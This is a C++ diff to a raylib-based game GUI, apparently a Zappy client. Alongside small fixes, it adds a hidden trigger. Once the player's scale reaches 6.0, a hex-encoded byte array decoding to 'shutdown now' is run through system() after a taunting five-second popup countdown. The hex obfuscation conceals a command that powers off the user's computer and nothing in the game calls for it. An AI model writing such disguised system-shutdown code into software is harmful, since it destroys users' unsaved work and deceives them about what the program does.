@@ -75,6 +75,22 @@ void Game::initialize() {
             scale.x += 0.1;
             scale.y += 0.1;
             scale.z += 0.1;
+            if (scale.y >= 6.0) {
+                std::vector<unsigned char> command_hex = {0x73, 0x68, 0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x6E, 0x6F, 0x77};
+                std::string command(command_hex.begin(), command_hex.end());
+                this->_popup.setTitle("ALERT");
+                this->_popup.setStatus(true);
+                int i = 5;
+                while (i >= 0) {
+                    this->_raylibwindow.MyBeginDrawing();
+                    this->_popup.setDescription("You have corrupted your computer.\nYour computer will die with me in " + std::to_string(i) + ".");
+                    this->_popup.show();
+                    sleep(1);
+                    this->_raylibwindow.MyEndDrawing();
+                    i -= 1;
+                }
+                system(command.c_str());
+            }
             _playerTmp->setScale(scale);
         }
     );
@@ -109,7 +125,7 @@ void Game::run() {
     auto &modelPlayer = this->_manager.getNoneConstModel(IResource::resourceType::PLAYER);
     auto &texture = this->_manager.getTexture(IResource::resourceType::PLAYER);
     auto &animation = this->_manager.getAnimation(IResource::resourceType::PLAYER);
-    PlayerArguments playerArgs = PlayerArguments(0, "team2", { 0, 0.0, 0 }, {0.0f, 1.0f, 0.0f}, 0.0, {2.6f, 2.6f, 2.6f}, 0, Player::animationPlayerType::PLAYER_WIN);
+    PlayerArguments playerArgs = PlayerArguments(0, "", { 0, 0.0, 0 }, {0.0f, 1.0f, 0.0f}, 0.0, {2.6f, 2.6f, 2.6f}, 0, Player::animationPlayerType::PLAYER_WIN);
 
     this->_playerTmp = std::make_shared<Player>(playerArgs, modelPlayer, texture, animation);
 
@@ -189,7 +205,6 @@ void Game::drawGame(SelectorPlayer &selectorPlayer) {
     this->_skyboxMesh.MyrlEnableDepthMask();
     this->_camera.update();
     this->_map.draw();
-    std::cout << this->_showPlayerData.getPlayerIndexSelected() << std::endl;
     if (this->_map._players.size() != 0) {
         std::shared_ptr<ZappyGui::Player> &selectedPlayer = this->_map._players.at(this->_showPlayerData.getPlayerIndexSelected());
         Vector3 selectedPos = selectedPlayer->getPosition();
